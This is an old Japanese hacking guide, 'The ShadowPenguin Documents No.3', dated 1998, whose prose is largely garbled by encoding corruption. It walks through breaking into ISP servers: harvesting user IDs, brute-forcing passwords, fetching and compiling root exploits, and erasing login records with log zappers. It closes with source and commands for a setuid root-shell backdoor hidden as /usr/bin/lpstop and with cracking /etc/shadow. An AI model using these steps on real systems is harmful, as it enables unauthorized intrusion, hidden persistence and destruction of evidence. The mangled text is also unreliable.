                      ====================================
                        The ShadowPenguin Documents No.3

                          - IȂhroւ̐N@ -
                               Written by ɂ
                                  Oct.18, 1998
                      ====================================

1. ͂߂ 

̃eLXgł́AISP iC^[lbgT[rXvoC_łjɐiroot
ƂłIȎЉ܂iIɁEEEł( ))BɋLڂ
erootA}T[oǗ҂͊ǗjςłB\
ISP ܂ˁB̃eLXǵAISP ̊ǗĂǗ҂Azgɂ
ŐNȂǂƂړÎ̂łBāAǂ
ISP ̕@ōUႢ܂B 

2.  

Ƃ肠Aȉ̂̂pӂĂB

1.Win95/98/NT}VB
2.ؗtq for Win32
3.extuser for Win32

2A3͂̃z[y[WɗĂ܂B
܂AnbNɂ̓VFAJEgƁAƂĂ֗łBāAtelnetłv
oǂ܂傤Btelnet_łN&root ̕@͂ł܂
AĨeLXgĂƂtelnetłISP ̂ݑΏۂƂ܂B͊ȒP
ADOS 

telnet www.hoge.ne.jp

ƂāAloginvvgoOKłB

3. ؗtqƃ[U[Xg 

ISP ̃T[oɂ́AOł̃AJEg܂BpXݒK
܂ȂƂ낾ƁAl炢̓[UƃpX[hcijoe Ƃj
邱Ƃ\܂Bؗtq́Avõ[UXg͂Ă΁A
Iftp pop3joe c[łBƂƂ́A[U[XgȂƎn
܂܂ˁB[U[Xg̎葁@́Avõz[y[Wɂ悭
ulz[y[Wꗗvăc甲Ă̂ʓIłBy[
ŴISP ́Aǂ܂茩lȂ񂾂A댯Ȃō폜Ⴂ܂傤
ˁBlz[y[Wꗗhtmlt@Cۑiy[Wɂ܂Ăꍇ
̓t@CtĂƕ֗jAextusrŃ[U[ID𒊏o܂B

extusr̎ǵA

extusr HTMLfile Pattern > usrlist.txt

łBHTMLfile͉lz[y[Whtmlt@CiNetscapeȂt@C- O
ĕۑOKjŁAPattern ̓[U[̒OɕtĂHTML̕łBႦ
Ahtmlt@C̃\[XmFāÃy[Wȉ̂悤ɃNĂꍇ

<a href="http://www.test.or.jp/~hogehoge/">

PatterńA

www.test.or.jp/~

ƂƁAwww.test.or.jp/~̕𔭌Ǎɑ/ " 
܂ł[U[IDƂ܂BȂAPattern 

<a href="http://www.test.or.jp/~

ƂꍇA"͈ɕt邱Ƃł܂̂ŁA+őp܂BPattern

<a href=+http://www.test.or.jp/~

Ǝw肵ĂB 

4. ؗtq𓮂 

āAextusrusrlist.txt ɓꂽƂŁA؂ɂĂ݂܂傤B؂N
āA[FileLoad]Őقǂusrlist.txt w肵A[Server]Ƀ^[QbgIw肵
܂BƂ́A[Go]{^Ύjoe T܂B܂A[ŰtpX
[hɂAŒpX[hŃA^bN肷郂[h܂̂ŁAjoe 
玎Ă݂ĂB

5. joeOC 

joe lłA؂~߂܂傤BlΏ\łBŁÅǗ
ISP ɉznbNāASĂ݂܂傤BƂ肠Atelnet
݂܂傤BAroot_܂BĂArootȂƃOc܂
ɂȂ̂ŁAnbNœݑȂꍇ͐N҂͈Ӓnłɂ܂i΁jBƂ
A

rlogin localhost

āAlastlog ܂܂Blastlog Ă̂́uȂ́Aǂ烍OC
vĂcŁAtelnetȂ񂩂ƂAvvg\OɏoĂ܂B
rootȂꍇrloginlocalhost ́AȂ̓}VȂ̂ŁAN҂́uƂ
ƂvĊłĂ܂B

āAyrootƂ΁AnbJ[VRVRグPacketStorm Ro
otShell Ȃ񂩂ɗĂroot-explot vOq؂ĎĝԎ葁
łˁB

Packet Storm	: http://www.genocide2600.com/~tattooman/index.shtml
RootShell	: http://www.rootshell.com

̑OɁAOSmF܂傤BOS̓OCƂɕ\܂ˁBāA
OSɍexploit vO肵܂BPacketStorm 

http://www.genocide2600.com/~tattooman/unix-exploits/

ɗĂ܂ˁBႦ΁A^[QbgSolaris2.4̏ꍇ́Ay[Wsolaris-exploi
ts/ fBNgɂSol24.zip PCɃ_Eĉ𓀂܂B

C ̃\[Xt@Cigq*.c ̃t@CjT[oŃRpCĎs
Asvci΁jRootɂȂ܂BȂAPCɃ_E\[Xt@ĆAPC̃eL
XgGfB^iȂǁjŕ\ĂāARs[y[XgŎIɂĂ܂
Bftp ƂyłǁAł傤N҂͕ʎg܂
B@́APC̃GfB^ŁuRs[vƁAI

%cat > ban24.c

Ƃ܂B̏ԂtelnetNCAg\tgŁuy[Xgv܂BIct
rl+DŔƁAhoge.cł܂BRpCccgcc ōs܂Bvvgo
ĂԂŁA

%cc ban24.c

Ƃ܂BŁA_Ȃ

%gcc ban24.c

ƂĂ݂܂傤Bł_ȂAƂ肠߂܂傤i΁jG[o


%a.out

ƂĂ݂܂傤Bvvg# ɂȂrootłB_ȂAقC vO
RpCĎsĂ݂܂傤BSă_ȂAς肠߂܂傤( ) 
܂ArootɂȂΐN҂̎łAȂȂ烍O͂c܂
łǗ҂yłˁB@ȊOłArootɂȂ@͂񂠂܂
AᏑ܂BŌ܂傤ˁBւ񂶂イɃeLXg
܂Bł_ȂAmbčl܂傤B 

6. roothacḱH 

Ƃ肠AN҂ɂƂăO͕K{ł傤Bzap ĂLȃO
܂̂ŁAƂ肠RgĂ݂܂傤BȒPłBȒPđ
͂܂Ai̓Oł͓ł܂̂ŁA悭gĂ܂B

wtmpx.c SolarisAIRIXp
zap2.c SunOSp

rootȂƎg܂B[U[hogeꍇ́ARpCA

#a.out hoge

ƂĂBǂAlastR}hŊmF܂傤BlastR}h́A
OC\̂łBƂ́A؂̃A^bNՂsyslogȂ񂩂ɎcĂ܂
AĂ݂܂傤BŃARootshell d܂܂ˁB

#include <stdio.h>
mainij
{
setuidi0j;
setgidi0j;
execli"/bin/csh","csh",NULLj;
}

ban24.c Ƃroot-explot vÓAZLeB[z[𗘗p̂ł
Apb`𓖂ĂrootɂȂ܂Brootshell ƁApb`𓖂Ă
ĂrootɂȂ܂Brootshell RpCchmod Achown ܂B

#cc rootshell.c -o rootshell
#chmod 4755 ./rootshell
#chown root ./rootshell

ŁArootshell ăR}hʃ[UŎsƁArootɂȂ܂Broot
shell AoɂȖOɕςēKȃfBNgɂق肱܂ƁAls
ᔭłȂł傤B

#mv ./rootshell /usr/bin/lpstop

tCɂȂȂAtouch œKɂ킹܂Bl̕@ŃOu܂B
́C/etc/shadow t@C𒸂johntheripper ŃNbN΁ApX[h
邱Ƃł܂BĔQɂISP ͍܂ŉЂ݂܂ˁB
ȂISP C܂傤()
